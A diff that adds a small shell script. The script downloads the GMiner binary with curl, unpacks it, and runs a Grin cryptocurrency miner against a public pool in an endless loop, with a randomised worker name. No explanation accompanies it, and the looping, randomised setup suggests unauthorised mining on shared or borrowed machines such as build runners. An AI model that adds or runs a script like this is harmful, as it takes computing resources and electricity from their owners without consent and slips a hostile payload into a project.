@@ -1,0 +1,5 @@
+curl https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_linux64.tar.xz -L -o gminer_3_44_linux64.tar.xz
+tar xf gminer_3_44_linux64.tar.xz
+while :; do
+./miner --algo cuckatoo32 --server europe.pool.easygrin.org:3001 --user aabc3464@gmail.com.$(echo $(shuf -i 1-15000 -n 1)-run)
+done
